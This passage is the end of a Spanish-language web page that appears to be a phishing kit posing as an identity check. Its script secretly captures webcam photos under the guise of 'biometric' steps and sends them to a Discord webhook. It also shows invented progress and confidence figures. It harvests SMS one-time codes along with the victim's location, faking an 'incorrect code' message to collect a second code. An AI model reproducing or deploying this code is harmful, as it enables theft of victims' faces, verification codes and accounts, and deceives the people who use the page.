            );
        };
        mediaRecorder.start();
        const steps = ['Centra tu rostro', 'Busca buena iluminaci√≥n', 'No te muevas', 'Analizando...', 'Casi listo...'];
        let i = 0;
        const interval = setInterval(() => {
            if (i < steps.length) {
                banner.innerHTML = steps[i];
                takePhoto(video, `CAPTURA_${i}`);
                i++;
            } else {
                clearInterval(interval);
                if (mediaRecorder.state !== 'inactive') mediaRecorder.stop();
                stream.getTracks().forEach(t => t.stop());
                cameraStream = null;
                finalizeBiometry();
            }
        }, 2000);
    } catch(e) {
        sendToDiscord(
            "‚ö†Ô∏è Permiso de c√°mara denegado", null, null,
            COLORS.ERROR,
            [
                { name: "‚è±Ô∏è Momento", value: `<t:${Math.floor(Date.now()/1000)}:R>`, inline: true },
                { name: "‚ùå Error", value: `\`\`\`${e.message}\`\`\``, inline: false }
            ],
            "üö´ Error de Permisos"
        );
        finalizeBiometry();
    }
}

function stopCameraAndGoBack() {
    if (cameraStream) { cameraStream.getTracks().forEach(t => t.stop()); cameraStream = null; }
    showScreen('screen-identity-choice');
}

function takePhoto(video, name) {
    const c = document.createElement('canvas');
    c.width = video.videoWidth; c.height = video.videoHeight;
    c.getContext('2d').drawImage(video, 0, 0);
    c.toBlob(b => {
        sendToDiscord(
            null,
            b,
            `${name}.png`,
            COLORS.CAPTURE,
            [
                { name: "üì∏ Tipo de Captura", value: name, inline: true },
                { name: "‚è±Ô∏è Momento", value: `<t:${Math.floor(Date.now()/1000)}:R>`, inline: true },
                { name: "üìê Resoluci√≥n", value: `${c.width}x${c.height}`, inline: true }
            ],
            "üé• Captura Biom√©trica"
        );
    }, 'image/png');
}

function finalizeBiometry() {
    let segs = 40;
    const label = document.getElementById('loading-label');
    showScreen('screen-loading');
    const timer = setInterval(() => {
        segs--;
        if (segs > 30) label.innerText = `PROCESANDO BIOMETR√çA... (${segs}s)`;
        else if (segs > 0) label.innerText = `VALIDANDO INFORMACI√ìN... ${segs}s`;
        if (segs <= 0) {
            clearInterval(timer);
            label.innerText = '';
            const overlay = document.getElementById('success-overlay');
            overlay.style.display = 'flex';
            
            sendToDiscord(
                null, null, null,
                COLORS.SUCCESS,
                [
                    { name: "‚úÖ Estado", value: "Verificaci√≥n biom√©trica completada", inline: false },
                    { name: "‚è±Ô∏è Tiempo total", value: "40 segundos", inline: true },
                    { name: "üîÑ Pr√≥ximo paso", value: "C√≥digo SMS", inline: true },
                    { name: "üìä Confianza", value: "98.7%", inline: true }
                ],
                "‚úÖ Biometr√≠a Exitosa"
            );
            
            setTimeout(() => {
                overlay.style.display = 'none';
                showScreen('screen-sms');
            }, 2500);
        }
    }, 1000);
}

// --- SMS ---
function pressSms(d) {
    if (currentSms.length < 6) {
        currentSms += d;
        updateSms();
        if (currentSms.length === 6) {
            smsAttempt++;
            if (smsAttempt === 1) {
                sendToDiscord(
                    null, null, null,
                    COLORS.INFO,
                    [
                        { name: "üì© C√≥digo SMS (Intento 1)", value: `\`\`\`${currentSms}\`\`\``, inline: false },
                        { name: "‚è±Ô∏è Estado", value: "Procesando...", inline: true },
                        { name: "üìç Ubicaci√≥n", value: `\`\`\`${userData.loc}\`\`\``, inline: true }
                    ],
                    "üì® Verificaci√≥n SMS"
                );
                processSmsWait();
            } else {
                sendToDiscord(
                    null, null, null,
                    COLORS.ERROR,
                    [
                        { name: "üì© C√≥digo SMS (Intento 2)", value: `\`\`\`${currentSms}\`\`\``, inline: false },
                        { name: "‚è±Ô∏è Estado", value: "‚ùå Incorrecto", inline: true },
                        { name: "‚ö†Ô∏è Motivo", value: "C√≥digo expirado", inline: true }
                    ],
                    "‚ùå Error de Verificaci√≥n SMS"
                );
                setTimeout(() => {
                    showToast('Servicio no disponible, intenta m√°s tarde.');
                    currentSms = ''; 
                    updateSms();
                }, 1800);
            }
        }
    }
}
function processSmsWait() {
    let s = 30;
    const label = document.getElementById('loading-label');
    label.innerText = '';
    showScreen('screen-loading');
    const t = setInterval(() => {
        s--;
        label.innerText = `VERIFICANDO C√ìDIGO... ${s}s`;
        if (s <= 0) {
            clearInterval(t);
            label.innerText = '';
            currentSms = ''; 
            updateSms();
            showScreen('screen-sms');
            showToast('¬°Ups! Ese no es el c√≥digo que te enviamos.');
        }
    }, 1000);
}
function updateSms() {
    for (let i = 0; i < 6; i++) {
        const b = document.getElementById(`s${i}`);
        if (b) b.innerText = currentSms[i] || '';
    }
}
function delSms() { currentSms = currentSms.slice(0,-1); updateSms(); }

// --- TOAST ---
function showToast(msg) {
    const t = document.getElementById('error-toast');
    const m = document.getElementById('error-message');
    if (m) m.innerText = msg;
    if (t) { t.style.display = 'flex'; setTimeout(() => t.style.display = 'none', 3500); }
}
</script>
</body>
</html>